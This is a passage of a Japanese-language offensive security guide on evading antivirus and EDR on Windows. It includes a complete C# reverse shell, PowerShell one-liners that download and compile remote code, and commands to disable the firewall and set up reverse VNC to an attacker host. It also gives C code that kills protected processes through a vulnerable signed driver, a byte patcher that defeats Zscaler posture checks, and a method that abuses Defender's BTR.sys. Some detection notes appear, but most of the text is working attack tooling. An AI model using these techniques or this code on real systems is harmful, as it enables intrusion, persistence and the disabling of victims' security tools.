`X86AsmPrinter::emitFunctionBodyStart()`と`emitFunctionBodyEnd()`は関数ごとのstubsを出力し、`emitEndOfAsmFile()`はhandlerを出力します。出力段階間で共有するシンボルを使えば、prologueから後続のepilogueへ分岐できます。手動でnear `je`を出力する場合は、`0F 84`に続けて、4バイトのMC expression `target - address_after_je`を書き込みます。handlerへのcallsとjumpsは、代わりに`MCInst`オブジェクト（`CALL64pcrel32`と`JMP_1`）として出力できます。何も変更していない場合、passは未選択の関数に対して`false`を返す必要がありますが、PoCはその経路で誤って`true`を返します。<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

PoCは`.funcmeta`に、XOR keyと、loader-relocated function pointerおよび実行時の長さを含む16-byte recordsを配置します。Cのフィールドは`uint32_t`ですが、handlerはrecordのオフセット`+8`にあるQWORDを読み込み、長さとそのpaddingを消費して、recordを`0x10`ずつ進みます。PE section名は8バイトに制限されるため、実行時の検索では`.funcmet`として認識されます。外部patcherは実行可能な`.stub`を追加し、stub内に元のentry-point RVAを保存して、`AddressOfEntryPoint`を書き換えます。PIC stubは`gs:[0x60]` → `[PEB+0x10]`からimage baseを取得し、PE32+ importsを走査して、すでにimport済みの`VirtualProtect`を解決してから、CRTより前に実行されます。<sup>[[38]](#references)[[39]](#references)</sup>

初期化処理では`gs:[0xE8]`にsentinelを設定し、metadataにある各関数を呼び出します。常に読み取り可能なprologueは`gs:[0xF0]`に関数の開始位置を記録し、sentinelを検出すると、まだclearなbodyをスキップします。その後、epilogueが`call handler`を実行します。handlerが13個のregister（`0x68`バイト）を保存した後、`[rsp+0x68]`にあるreturn addressが変換後の関数の終端となるため、`end - start`をmetadata recordに書き込めます。すべてのbodyをmaskした後、stubはsentinelをクリアし、`ImageBase + original_entry_point_RVA`へジャンプします。<sup>[[38]](#references)[[39]](#references)</sup>

通常のcall時には、prologueが同じ対称handlerを呼び出してbodyをdecodeします。最後の経路は追加されたepilogueにフォールスルーし、それ以前のreturnはすべて共有handlerへ直接ジャンプします。通常のepilogueも`call`ではなく`jmp handler`を使うため、再度maskした後、handlerの`ret`は呼び出し元の元のreturn addressを消費し、関数の戻り値を`RAX`に保持します。<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

handlerは現在のrecordを見つけ、固定長の可視prologue（このビルドでは`0x46`バイト）をスキップします。残りの領域を`PAGE_EXECUTE_READWRITE`に変更し、低位key byteで1バイトずつXORした後、`PAGE_EXECUTE_READ`に設定します。この同じループが、entry時にはdecodeし、通常のexit時にはencodeします。<sup>[[38]](#references)[[39]](#references)</sup>

この設計で有力なindicatorには、次のものがあります。<sup>[[38]](#references)[[39]](#references)</sup>

- 実行可能な`.stub`内にあるentry pointと、keyおよびrelocated `.text` pointersを格納する`.funcmet` section。
- pre-CRTでのPEB、import table、section tableの解析後に、各metadata pointerを介して呼び出す処理。
- 同一の`call`/`pop` PIC prologuesと、1つのhandlerへリダイレクトされる多数のreturn sites。
- `gs:[0xE8]`、`gs:[0xF0]`、`gs:[0xF8]`への書き込みに続く、`VirtualProtect`による繰り返しの保護属性変更と、image-backed executable pagesへのバイト単位のXOR書き込み。

これはmemory-scanner evasionであり、暗号学的な保護ではありません。patch済みファイルには元のclear bodyが残っており、debuggerで`VirtualProtect`やXORループにbreakを設定すれば、実行中の関数をdumpできます。単一バイトのXOR、読み取り可能なmetadata、固定された`0x46`バイトの境界も、オフラインでの復元を容易にします。<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoCのTEB slotsはthread-localですが、改変されたcode pagesはprocess-wideです。そのため、並行または再帰的なentryが発生すると、別の呼び出しが実行中に命令が再度toggleされる可能性があります。また、例外やnonlocal exitsによって再mask処理が迂回されることもあります。堅牢な実装では、状態遷移を同期し、`lpflOldProtect`を通じて返された実際の保護属性を復元し、stubの長さをハードコードせず、x64 stack alignmentについて`call`と`jmp`の両経路を監査し、実行可能なバイト列を書き換えた後に`FlushInstructionCache`を呼び出す必要があります。Microsoftは、実行可能コードを変更する際のinstruction-cache coherencyについて、呼び出し元に責任があることを明示しています。<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

インターネットから実行ファイルをダウンロードして実行する際に、この画面が表示されたことがあるかもしれません。

Microsoft Defender SmartScreenは、潜在的に悪意のあるアプリケーションの実行からエンドユーザーを保護するためのセキュリティメカニズムです。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreenは主にレピュテーションベースの方式で動作します。つまり、あまりダウンロードされていないアプリケーションはSmartScreenを起動させ、エンドユーザーに警告してファイルの実行を阻止します（ただし、More Info -> Run anywayをクリックすれば実行できます）。

**MoTW** (Mark of The Web) は、Zone.Identifierという名前の[NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)です。ファイルをインターネットからダウンロードすると、そのダウンロード元URLとともに自動的に作成されます。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルのZone.Identifier ADSを確認します。</p></figcaption></figure>

> [!TIP]
> **信頼された**署名証明書で署名された実行ファイルでは、**SmartScreenは起動しない**ことに注意してください。

payloadにMark of The Webが付与されないようにする非常に効果的な方法は、ISOなどのコンテナに格納することです。これは、Mark-of-the-Web (MOTW)を**非NTFS**ボリュームに適用**できない**ためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)は、Mark-of-the-Webを回避するためにpayloadを出力コンテナにパッケージ化するツールです。

使用例:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

これは、[PackMyPayload](https://github.com/mgeeky/PackMyPayload/) を使ってISOファイル内にpayloadをパッケージ化し、SmartScreenをbypassするデモです。

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) は、アプリケーションやシステムコンポーネントが**イベントをログに記録**できる、Windowsの強力なログ記録メカニズムです。ただし、セキュリティ製品が悪意あるアクティビティを監視・検出するためにも利用できます。

AMSIを無効化（bypass）するのと同様に、ユーザースペースプロセスの **`EtwEventWrite`** 関数を、イベントを記録せずに即座に返すようにすることも可能です。これは、関数が即座に返るようメモリ上でパッチを適用することで、そのプロセスのETWログ記録を実質的に無効化します。

詳しくは、**[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) と [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** を参照してください。<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C#バイナリをメモリ上にロードする方法は以前から知られており、AVに検知されずにpost-exploitationツールを実行する非常に有効な方法です。

payloadはディスクに触れることなく直接メモリにロードされるため、プロセス全体のAMSIにパッチを適用することだけを考慮すればよいでしょう。

ほとんどのC2フレームワーク（sliver、Covenant、metasploit、CobaltStrike、Havocなど）は、C# assembliesをメモリ上で直接実行する機能をすでに備えていますが、その方法はいくつかあります。

- **Fork\&Run**

**新しい使い捨てプロセスを起動**し、その新しいプロセスにpost-exploitationの悪意あるコードをinjectして実行し、完了したら新しいプロセスを終了させる方法です。これにはメリットとデメリットの両方があります。Fork and Run方式のメリットは、実行がBeacon implantプロセスの**外部**で行われることです。つまり、post-exploitationアクションで問題が発生したり検知されたりしても、**implantが生き残る可能性が大幅に高くなります。** デメリットは、**Behavioural Detections** に検知される**可能性が高くなる**ことです。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

post-exploitationの悪意あるコードを**自身のプロセスに**injectする方法です。こうすることで、新しいプロセスを作成してAVにスキャンされるのを避けられますが、payloadの実行中に問題が発生すると、クラッシュする可能性があるため、**beaconを失う可能性が大幅に高くなります。**

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assemblyのロードについて詳しく知りたい場合は、この記事 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) と、InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) を参照してください。

C# Assembliesは**PowerShellから**ロードすることもできます。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1tの動画](https://www.youtube.com/watch?v=oe11Q-3Akuk)を参照してください。

## 他のプログラミング言語の使用

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) で提案されているように、侵害したマシンから**攻撃者が管理するSMB共有上にインストールされたインタープリター環境**にアクセスできるようにすることで、他の言語を使って悪意あるコードを実行できます。

SMB共有上のインタープリターバイナリと環境へのアクセスを許可すれば、侵害したマシンのメモリ内で、これらの言語を使って**任意のコードを実行できます。**

リポジトリによると、Defenderは引き続きスクリプトをスキャンしますが、Go、Java、PHPなどを利用することで、**静的シグネチャをbypassする柔軟性が高まります。** これらの言語で難読化していないランダムなreverse shellスクリプトを使ったテストでは、成功が確認されています。

## TokenStomping

Token stompingは、EDRやAVなどのセキュリティ製品のアクセストークンを操作します。トークンの権限を下げると、プロセスを実行したまま、権限を必要とする検査や修復アクションを実行できないようにできます。

これを防ぐために、Windowsは**外部プロセスが**セキュリティプロセスのトークンに対するハンドルを取得できないようにすることができます。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## 信頼されたソフトウェアの使用

### Chrome Remote Desktop

[**このブログ記事**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)で説明されているように、被害者のPCにChrome Remote Desktopをデプロイし、それを使ってPCを乗っ取り、永続化するのは簡単です。<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ からダウンロードし、「Set up via SSH」をクリックしてから、Windows用のMSIファイルをクリックしてダウンロードします。
2. 被害者のマシン上でインストーラーをサイレント実行します（管理者権限が必要です）。`msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktopのページに戻り、「次へ」をクリックします。ウィザードで認証を求められたら、「Authorize」ボタンをクリックして続行します。
4. 必要な箇所を調整して、提示されたコマンドを実行します。`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（`--pin`パラメーターを使うと、GUIを使わずにPINを設定できます。）


## 高度なEvasion

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Evasionは非常に複雑なトピックです。1つのシステム内でも多くの異なるテレメトリソースを考慮しなければならないことがあり、成熟した環境で完全に検知されずにいるのはほぼ不可能です。

対処する環境ごとに、それぞれ異なる強みと弱みがあります。

高度なEvasionテクニックを理解するために、[@ATTL4S](https://twitter.com/DaniLJ94)のこの講演をぜひご覧ください。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

こちらも、[@mariuszbit](https://twitter.com/mariuszbit)によるEvasion in Depthについての素晴らしい講演です。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **古いテクニック**

### **Defenderが悪意あるものと判断する箇所を特定する**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)を使うと、**バイナリの一部を削除**しながら、Defenderが悪意あるものと判断している箇所を**特定して切り出せます。**\
同じことを行うもう1つのツールは[**avred**](https://github.com/dobin/avred)です。サービスを提供するオープンなWebサイトとして[**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)もあります。

### **Telnet Server**

Windows 10以前のすべてのWindowsには、管理者として次の操作を行うことでインストールできる**Telnet server**が付属していました。

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

システム起動時に**自動起動**するよう設定し、今すぐ実行します:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**telnetポートを変更（stealth）し、ファイアウォールを無効化する:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

こちらからダウンロードします: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup ではなく bin downloads を選びます)

**ホスト上で**: _**winvnc.exe**_ を実行し、サーバーを設定します:

- _Disable TrayIcon_ オプションを有効にします
- _VNC Password_ にパスワードを設定します
- _View-Only Password_ にパスワードを設定します

次に、バイナリ _**winvnc.exe**_ と新たに作成されたファイル _**UltraVNC.ini**_ を**被害者の端末内**に移動します

#### **Reverse connection**

**攻撃者**は自身の**ホスト上で** `vncviewer.exe -listen 5900` を実行し、Reverse **VNC connection** を受け取れる状態にします。次に、**被害者の端末内で**、winvnc デーモン `winvnc.exe -run` を起動し、`winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行します

**警告:** ステルス性を維持するため、次の操作は避けてください

- `winvnc` がすでに実行中の場合は起動しないでください。[ポップアップ](https://i.imgur.com/1SROTTl.png)が表示されます。`tasklist | findstr winvnc` で実行中か確認できます
- 同じディレクトリに `UltraVNC.ini` がない状態で `winvnc` を起動しないでください。[設定ウィンドウ](https://i.imgur.com/rfMQWcf.png)が開きます
- ヘルプを表示するために `winvnc -h` を実行しないでください。[ポップアップ](https://i.imgur.com/oc18wcu.png)が表示されます

### GreatSCT

こちらからダウンロードします: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCT内:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

次に、`msfconsole -r file.rc` で**listenerを起動**し、以下の方法で**xml payloadを実行**します。:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**現在の Defender はプロセスを非常に速く終了させます。**

### 独自の reverse shell をコンパイルする

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初の C# Revershell

次のコマンドでコンパイルします:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

次のものと組み合わせて使用します:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# コンパイラを使用する

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行：

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscatorの一覧: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### injectorを構築するためのPythonの使用例：

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のツール

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### その他

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space から AV/EDR を停止する

Storm-2603 は、ransomware を投下する前に endpoint protection を無効化するため、**Antivirus Terminator** と呼ばれる小型のコンソールユーティリティを利用しました。このツールは**独自の脆弱だが *署名済み* の driver**を持ち込み、それを悪用して、Protected-Process-Light (PPL) の AV サービスでさえ阻止できない、特権が必要な kernel 操作を実行します。<sup>[[12]](#references)</sup>

主なポイント
1. **署名済み driver**: ディスクに配置されるファイルは `ServiceMouse.sys` ですが、実体は Antiy Labs の「System In-Depth Analysis Toolkit」に含まれる、正規に署名された driver `AToolsKrnl64.sys` です。この driver には有効な Microsoft 署名があるため、Driver-Signature-Enforcement (DSE) が有効でも読み込まれます。
2. **Service のインストール**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   最初の行でドライバーを**kernel service**として登録し、2行目で起動することで、`\\.\ServiceMouse` が user land からアクセス可能になります。
3. **ドライバーが公開する IOCTL**
   | IOCTL code | Capability                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PID を指定して任意のプロセスを終了する（Defender/EDR サービスの停止に使用） |
   | `0x990000D0` | ディスク上の任意のファイルを削除する |
   | `0x990001D0` | ドライバーをアンロードし、サービスを削除する |

   最小限の C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **動作する理由**: BYOVD はユーザーモードの保護を完全に迂回します。カーネルで実行されるコードは、PPL/PP、ELAM、その他のハードニング機能に関係なく、*保護された*プロセスを開いたり、終了させたり、カーネルオブジェクトを改ざんしたりできます。

検出 / 緩和策
•  Microsoft の脆弱なドライバーのブロックリスト（`HVCI`、`Smart App Control`）を有効にし、Windows が `AToolsKrnl64.sys` を読み込まないようにします。
•  新しい *カーネル* サービスの作成を監視し、ワールド書き込み可能なディレクトリからドライバーが読み込まれた場合や、許可リストにない場合にアラートを発生させます。
•  ユーザーモードのハンドルがカスタムデバイスオブジェクトに作成された後に、不審な `DeviceIoControl` 呼び出しが行われていないか監視します。

### ディスク上のバイナリパッチによる Zscaler Client Connector のポスチャチェックの迂回

Zscaler の **Client Connector** は、デバイスのポスチャルールをローカルで適用し、結果を他のコンポーネントとやり取りする際に Windows RPC に依存します。次の2つの設計上の弱点により、完全な迂回が可能です。

1. ポスチャ評価は**すべてクライアント側**で行われる（サーバーにはブール値が送信される）。
2. 内部 RPC エンドポイントは、接続する実行ファイルが Zscaler によって署名されていること（`WinVerifyTrust` による）のみを検証する。<sup>[[11]](#references)</sup>

**ディスク上の4つの署名済みバイナリにパッチを適用する**ことで、両方の仕組みを無効化できます。

| バイナリ | パッチを適用する元のロジック | 結果 |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に `1` を返すため、すべてのチェックに準拠します |
| `ZSAService.exe` | `WinVerifyTrust` への間接呼び出し | NOP 化 ⇒ どのプロセス（署名なしのものも含む）でも RPC パイプに接続できます |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` に置き換えます |
| `ZSATunnel.exe` | トンネルの整合性チェック | 短絡させます |

パッチャーの最小限の抜粋:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

元のファイルを置き換え、サービススタックを再起動すると:

* 姿勢チェックは**すべて**緑色／準拠と表示されます。
* 署名されていないバイナリや改変されたバイナリから、名前付きパイプの RPC エンドポイント（例: `\\RPC Control\\ZSATrayManager_talk_to_me`）を開けます。
* 侵害されたホストは、Zscaler ポリシーで定義された内部ネットワークに無制限にアクセスできるようになります。

このケーススタディは、クライアント側だけで行われる信頼判断と単純な署名チェックが、わずかなバイトパッチで回避できることを示しています。

## Microsoft Defender `BTR.sys` の信頼された機能の悪用

Defender の **Boot-Time Removal** ドライバーは、従来の BYOVD とは異なる有用な例です。`BTR.sys` は、メモリ破損バグも IOCTL インターフェースもない、Microsoft 署名済みの正規の修復コンポーネントです。管理者アクセスと `SeLoadDriverPrivilege` を取得した後、オペレーターは代わりに、非公開の修復トランザクションを偽造して、本来の Ring-0 ファイル／レジストリ操作を実行できます。これは**侵害後の AV/EDR 無効化プリミティブであり、初期アクセスや権限昇格ではありません**。また、目立つサードパーティ製ドライバーを持ち込まず、標的自身の `MpEngine.dll` にある `BOOTTIMETOOL` リソースからドライバーを抽出できます。<sup>[[36]](#references)</sup>

### ワンショットドライバーのステージング

Defender は通常、このリソースをランダムな `[a-z]{8}.sys` ファイルとして展開し、同様の名前を持つカーネルサービスを登録します。`DriverEntry` はサービスの `Args` 値を読み取り、参照先の NTFS ADS を開いて、アクションリストを復号して検証し、フィードバックを書き込みます。実行に成功すると `0xC0000056` (`STATUS_DELETE_PENDING`) を返し、ドライバーが常駐せずアンロードされるようにします。偽造サービスには、次の特徴的な値があります。<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` ストリームには、RC4で暗号化されたblobが1つ含まれます。解析対象のビルドでは固定の256バイトキーが再利用されるため、暗号化は認可の境界にはなりません。有効な平文は、24バイトのグローバルヘッダー（`Magic=0xFEE1DEAD`、`Version=2`、`PayloadOffset=0x10`、ヘッダーCRC、ペイロードから導出されたトランザクションID）に続き、ヌル終端されたUTF-16のフィードバックパスと、任意の数のアイテムで構成されます。各アイテムは16バイトのヘッダー（`DataSize`、`Action`、`HeaderCRC`、`DataCRC`）と、アクション固有のデータからなり、データの末尾は**ちょうど4バイトのNUL**です。各ヘッダー／データ領域は、CRC-32多項式`0xEDB88320`、初期状態`0xFFFFFFFF`、**最終XORなし**（`~CRC32`）で個別に検証されます。CRCの状態は領域ごとにリセットされます。<sup>[[36]](#references)[[37]](#references)</sup>

受け付けられるアクションIDによって、以下のカーネルプリミティブが利用できます。<sup>[[36]](#references)[[37]](#references)</sup>

| ID | アイテムデータ | 結果 |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | ロック中のファイルを含め、ファイルを削除する |
| 2 | `[UTF-16 path]` | 空のディレクトリを削除する |
| 3 | `[Flags][source][destination]` | 攻撃者が選択した保護対象パスへファイルを移動する。destinationが空の場合は削除する |
| 4 | `[Flags][key path]` | レジストリキーを再帰的に削除する |
| 5 | `[Flags][key path + "\\" + value]` | レジストリ値を削除する |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | レジストリ値を作成／更新し、不足しているキーのパスを作成する |

アクション5と6では、ワイヤ上のキー／値の区切り文字は**連続する2つのバックスラッシュ**です。一般的な形式のパスでは正しく分割されません。フィードバックファイルはおおむねリクエストを反映しますが、各アイテムの先頭4バイトのデータは、結果の`NTSTATUS`になります。先頭にフラグフィールドがないアクション1と2では、ステータス用の領域を確保するため、BTRはパスを末尾の予約済み4バイトへ移動します。<sup>[[36]](#references)</sup>

### `BTR_CLI`のワークフローと起動初期の実行可能期間

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI)は一連の処理を実装します。ローカルのDefenderから`BTR.sys`を抽出し、`<random>.sys:changelist`とフィードバックストリームを作成し、連鎖したアクションをシリアライズ、チェックサム計算、暗号化した後、サービスのレジストリキーを直接作成します。そして、`-trigger now`では`NtLoadDriver`を呼び出し、`-trigger boot`ではシステム起動時に読み込まれるドライバーとして残します。レジストリを直接設定することで、通常のSCMの`CreateServiceW`経路を回避するため、サービスインストールのイベントID 7045は記録されません。起動時にトリガーされるアーティファクトは、後から`BTR_CLI.exe -cleanup <service_name>`で削除できます。<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
